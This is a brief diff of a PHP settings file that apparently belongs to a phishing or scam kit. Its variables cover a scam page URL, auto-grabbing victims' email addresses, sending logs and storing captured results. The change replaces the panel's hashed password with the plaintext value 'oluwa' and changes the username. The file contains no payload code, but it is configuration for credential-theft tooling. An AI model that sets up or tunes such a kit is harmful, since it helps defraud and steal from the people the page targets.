@@ -7,8 +7,8 @@ ini_set('display_errors', 0);
 ini_set('error_log', 'error.log');
 
 $use_auth = true;
-$afa = 'case';
-$psw = '$2y$10$x8lrwVO8weLCfAOevjLnzeQdhPqR07Jnz1MlDSmJFR1zp05TixPJy';
+$afa = 'ife';
+$psw = 'oluwa';
 $sesLogged = '333C9C11MTIzNTVZbwuc1243QkU4TC8uczY';
 $maillistfilename = "qxdswraz.txt";
 $filltimes = 4;
@@ -23,4 +23,5 @@ $savechkertext = "yes";
 $chkrfilename = "1logs01";
 $sendLog = "yes";
 $autograbemail = "yes"; 		
+
 $scamaurl = 'l';
